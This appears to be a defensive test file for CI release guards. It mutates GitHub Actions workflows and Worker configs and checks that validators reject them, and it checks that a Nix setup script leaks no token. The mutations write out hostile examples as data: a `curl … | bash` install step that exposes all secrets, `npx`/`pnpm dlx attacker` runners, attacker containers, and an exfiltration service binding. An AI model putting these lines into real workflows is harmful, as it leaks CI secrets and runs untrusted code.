import { afterAll, describe, expect, test } from 'bun:test';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const root = join(import.meta.dir, '../..');
const scratch = mkdtempSync(join(tmpdir(), 'g23-release-'));
afterAll(() => rmSync(scratch, { recursive: true, force: true }));

function workflow(file: string): any {
  const parsed = Bun.spawnSync(['yq', '-o=json', '.', join(root, file)]);
  expect(parsed.exitCode).toBe(0);
  return JSON.parse(parsed.stdout.toString());
}

function gate(change: (workflow: any) => void) {
  const folder = mkdtempSync(join(scratch, 'tree-'));
  mkdirSync(join(folder, '.github'));
  cpSync(join(root, '.github/workflows'), join(folder, '.github/workflows'), { recursive: true });
  cpSync(join(root, '.releaserc.yaml'), join(folder, '.releaserc.yaml'));
  const file = '.github/workflows/relay-hosted.yaml';
  const data = workflow(file);
  change(data);
  writeFileSync(join(folder, file), JSON.stringify(data));
  return Bun.spawnSync(['bash', join(root, 'scripts/validate/release-guards.sh'), '--root', folder]);
}

describe('E-209 token jobs require review of every execution surface', () => {
  const mutations: Record<string, (job: any, data: any) => void> = {
    'step shell': job => {
      job.steps[0].shell = 'npx -y attacker {0}';
    },
    'job shell': job => {
      job.defaults = { run: { shell: 'node {0}' } };
    },
    'workflow shell': (_job, data) => {
      data.defaults = { run: { shell: 'npx attacker {0}' } };
    },
    container: job => {
      job.container = 'attacker:latest';
    },
    services: job => {
      job.services = { attacker: { image: 'attacker:latest' } };
    },
    'prefixed execution': job => {
      job.steps.push({ run: 'FOO=1 command wrangler deploy --config attacker.json' });
    },
    'alternate package runner': job => {
      job.steps.push({ run: 'pnpm dlx attacker' });
    },
    'renamed spaced secret': (job, data) => {
      const holder = {
        ...job,
        steps: [{ env: { TOKEN: '${{ toJSON ( secrets ) }}' }, run: 'curl https://example.invalid/install | bash' }],
      };
      data.jobs.unreviewed = holder;
    },
    'a deployment secret with the GITHUB_TOKEN prefix': (job, data) => {
      data.jobs.unreviewed = {
        ...job,
        steps: [{ env: { TOKEN: '${{ secrets.GITHUB_TOKEN_DEPLOY }}' }, run: 'echo synthetic' }],
      };
    },
    'a branch condition that escapes the main guard': job => {
      job.if = "github.ref == 'refs/heads/main' || github.event_name == 'pull_request'";
    },
  };
  for (const [name, mutate] of Object.entries(mutations)) {
    test(name, () => {
      const result = gate(data => mutate(data.jobs.deploy, data));
      expect(result.exitCode, result.stderr.toString()).toBe(1);
    }, 120_000);
  }
});

describe('E-224 the actual artifact verifier refuses unrelated Worker resources', () => {
  const cases = [
    [
      'relay-hosted.yaml',
      'packages/plugins/connections/worker/wrangler.hosted.json',
      'relay-bundle',
      'wrangler.hosted.json',
    ],
    [
      'link-store-hosted.yaml',
      'packages/plugins/catalogs/worker/wrangler.link-store.hosted.json',
      'link-store-bundle',
      'wrangler.link-store.hosted.json',
    ],
  ];
  for (const [name, source, bundle, config] of cases) {
    test(name ?? '', () => {
      const data = workflow(`.github/workflows/${name}`);
      const verify = data.jobs.deploy.steps.find((step: any) => step.name === 'Verify the handed-over bundle');
      const runner = mkdtempSync(join(scratch, 'runner-'));
      const folder = join(runner, bundle ?? '');
      mkdirSync(folder);
      writeFileSync(join(folder, 'worker.js'), 'export default {};');
      if (name === 'relay-hosted.yaml') writeFileSync(join(folder, 'fingerprint'), 'synthetic-fingerprint');
      const pristine = { ...JSON.parse(readFileSync(join(root, source ?? ''), 'utf8')), main: 'worker.js' };
      const run = (value: unknown) => {
        writeFileSync(join(folder, config ?? ''), JSON.stringify(value));
        return Bun.spawnSync(['bash', '-c', verify.run], {
          env: { ...process.env, ...data.env, RUNNER_TEMP: runner },
        }).exitCode;
      };
      expect(run(pristine)).toBe(0);
      const changed = structuredClone(pristine);
      changed.durable_objects.bindings[0].script_name = 'unrelated-worker';
      expect(run(changed)).toBe(1);
      expect(run({ ...pristine, services: [{ binding: 'EXFILTRATE', service: 'unrelated-worker' }] })).toBe(1);
      expect(
        run({
          ...pristine,
          migrations: [
            { tag: 'bad', transferred_classes: [{ from: 'Secret', from_script: 'unrelated-worker', to: 'Secret' }] },
          ],
        }),
      ).toBe(1);
    });
  }
});

test('E-230 warm Nix configuration carries no GitHub credential into tests', () => {
  const script = readFileSync(join(root, '.github/actions/setup-nix/scripts/linux-warm-nix.sh'), 'utf8');
  // Evaluate only definitions; bootstrap/apply/capture (and their sudo calls) are never invoked.
  const definitions = script.slice(0, script.lastIndexOf('\ncase "${1:-}" in'));
  const fixture = join(scratch, 'warm-config.sh');
  writeFileSync(fixture, `${definitions}\nwrite_custom_conf`);
  const generated = Bun.spawnSync(['bash', fixture], {
    env: {
      ...process.env,
      GITHUB_TOKEN_VALUE: 'synthetic-g23-fetch-credential',
      NIX_CONF: 'experimental-features = nix-command flakes',
    },
  });
  expect(generated.exitCode).toBe(0);
  expect(generated.stdout.toString()).not.toContain('synthetic-g23-fetch-credential');
  expect(generated.stdout.toString()).not.toContain('access-tokens');
  expect(generated.stdout.toString()).toContain('experimental-features = nix-command flakes');
});
